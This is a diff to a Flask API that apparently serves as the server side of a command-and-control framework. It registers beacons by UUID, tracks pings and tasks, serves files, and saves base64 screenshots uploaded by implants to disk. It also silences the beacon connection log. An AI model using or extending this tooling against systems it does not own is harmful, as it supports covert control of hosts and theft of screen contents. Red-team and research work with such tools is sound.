@@ -2,6 +2,8 @@
 import json
 import os
 import datetime
+import base64
+import uuid
 
 from flask import request, Response, send_from_directory, jsonify
 from flask_restful import Resource
@@ -10,9 +12,17 @@ from database.models import Task, Result, TaskHistory, Register, Pinger, Screens
 
 my_list = []
 UPLOAD_DIRECTORY = "./api_uploaded_files"
+DOWNLOAD_DIRECTORY = "./api_download_files"
+SCREENSHOT_DIRECTORY = "./screenshots"
 
 if not os.path.exists(UPLOAD_DIRECTORY):
     os.makedirs(UPLOAD_DIRECTORY)
+
+if not os.path.exists(SCREENSHOT_DIRECTORY):
+    os.makedirs(SCREENSHOT_DIRECTORY)
+
+if not os.path.exists(DOWNLOAD_DIRECTORY):
+    os.makedirs(DOWNLOAD_DIRECTORY)
 
 class Fileslist(Resource):
     """Endpoint to list files on the server."""
@@ -27,7 +37,7 @@ class Fileslist(Resource):
 class Filesdownload(Resource):
     """Download a file."""
     def get(self, path):
-        return send_from_directory(UPLOAD_DIRECTORY, path, as_attachment=True)
+        return send_from_directory(DOWNLOAD_DIRECTORY, path, as_attachment=True)
 
 class Filesupload(Resource):  
     """Upload a file."""
@@ -62,7 +72,7 @@ class Registers(Resource):
         if str(request.get_json()) != '{}':
             # Parse out the result JSON that we want to add to the database
             body = request.get_json()
-            print("Beacon Connected: {}".format(body))
+            #print("Beacon Connected: {}".format(body))
             json_obj = json.loads(json.dumps(body))
             for key in json_obj.keys():
                 # Look for beacon UUID and add it to our list
@@ -103,18 +113,16 @@ class CheckPings(Resource):
         return Response(ping, mimetype="application/json", status=200)
 
 class Screenshots(Resource):
-    def get(self):
-        # Get all the objects and return them to the user
-        images = Screenshot.objects().to_json()
-        #Pinger.objects().delete()
-        return Response(images, mimetype="application/json", status=200)
-    
     def post(self):
         # Parse out the JSON body we want to add to the database
         body = request.get_json()
         json_obj = json.loads(json.dumps(body))
-        # Save Screenshot object to database
-        Screenshot(**json_obj).save()
+        base64_blob = json_obj['Image']
+        imgdata = base64.b64decode(base64_blob)
+        uuid2 = str(uuid.uuid4())
+        filename = f"{uuid2}.jpeg"
+        with open(os.path.join(SCREENSHOT_DIRECTORY, filename), 'wb') as fp:
+            fp.write(imgdata)
         return Response("Success!", mimetype="application/json", status=200)
 
 class Tasks(Resource):
